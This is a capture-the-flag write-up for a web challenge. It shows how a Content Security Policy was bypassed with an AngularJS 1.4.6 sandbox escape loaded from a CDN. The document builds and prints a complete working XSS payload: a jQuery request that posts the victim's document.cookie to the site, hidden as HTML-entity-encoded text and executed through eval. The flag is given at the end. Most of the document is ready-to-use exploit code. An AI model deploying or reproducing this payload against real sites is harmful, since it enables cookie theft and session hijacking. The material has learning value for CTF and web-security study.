## Solution

XSS doesnt work due to CSP

```
<img src=x onerror=console.log(1); >
```

Then just search Hacktricks lmao

```js
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>
```

https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

![[Pasted image 20221202233617.png]]

![[Pasted image 20221202233514.png]]


### Payload?

### Form submission code

```js
$.ajax({
	type: "POST",
	url: "/post",
	data: JSON.stringify({"title":"Cookie", "content":document.cookie}),
	dataType: "json",
	contentType : "application/json"
}).done(function(response){
	if (response.message == "Success"){
		window.location.href = "/blog";
	}
	else {
		console.log(response.message);
	}
});
```

HTML encode into payload 1

```html
<span id=payload>
&Tab;&dollar;&period;ajax&lpar;&lcub;&NewLine;&Tab;&Tab;type&colon; &quot;POST&quot;&comma;&NewLine;&Tab;&Tab;url&colon; &quot;&sol;post&quot;&comma;&NewLine;&Tab;&Tab;data&colon; JSON&period;stringify&lpar;&lcub;&quot;title&quot;&colon;&quot;Cookie&quot;&comma; &quot;content&quot;&colon;document&period;cookie&rcub;&rpar;&comma;&NewLine;&Tab;&Tab;dataType&colon; &quot;json&quot;&comma;&NewLine;&Tab;&Tab;contentType &colon; &quot;application&sol;json&quot;&NewLine;&Tab;&rcub;&rpar;&period;done&lpar;function&lpar;response&rpar;&lcub;&NewLine;&Tab;&Tab;if &lpar;response&period;message &equals;&equals; &quot;Success&quot;&rpar;&lcub;&NewLine;&Tab;&Tab;&Tab;window&period;location&period;href &equals; &quot;&sol;blog&quot;&semi;&NewLine;&Tab;&Tab;&rcub;&NewLine;&Tab;&Tab;else &lcub;&NewLine;&Tab;&Tab;&Tab;console&period;log&lpar;response&period;message&rpar;&semi;&NewLine;&Tab;&Tab;&rcub;&NewLine;&Tab;&rcub;&rpar;&semi;
</span>

```

Combine with JS payload

```js
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(document.getElementById("payload").innerText);//');}} </div>
```


Final Payload


```html
<span id=payload>
&Tab;&dollar;&period;ajax&lpar;&lcub;&NewLine;&Tab;&Tab;type&colon; &quot;POST&quot;&comma;&NewLine;&Tab;&Tab;url&colon; &quot;&sol;post&quot;&comma;&NewLine;&Tab;&Tab;data&colon; JSON&period;stringify&lpar;&lcub;&quot;title&quot;&colon;&quot;Cookie&quot;&comma; &quot;content&quot;&colon;document&period;cookie&rcub;&rpar;&comma;&NewLine;&Tab;&Tab;dataType&colon; &quot;json&quot;&comma;&NewLine;&Tab;&Tab;contentType &colon; &quot;application&sol;json&quot;&NewLine;&Tab;&rcub;&rpar;&period;done&lpar;function&lpar;response&rpar;&lcub;&NewLine;&Tab;&Tab;if &lpar;response&period;message &equals;&equals; &quot;Success&quot;&rpar;&lcub;&NewLine;&Tab;&Tab;&Tab;window&period;location&period;href &equals; &quot;&sol;blog&quot;&semi;&NewLine;&Tab;&Tab;&rcub;&NewLine;&Tab;&Tab;else &lcub;&NewLine;&Tab;&Tab;&Tab;console&period;log&lpar;response&period;message&rpar;&semi;&NewLine;&Tab;&Tab;&rcub;&NewLine;&Tab;&rcub;&rpar;&semi;
</span>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(document.getElementById("payload").innerText);//');}} </div>
```


![[Pasted image 20221203004522.png]]

# Flag

`STF22{cl0uDfl4r3!!_@nd_@ngu1ar_ar3_de_b35+}`

3rd solver

![[Pasted image 20221203004455.png]]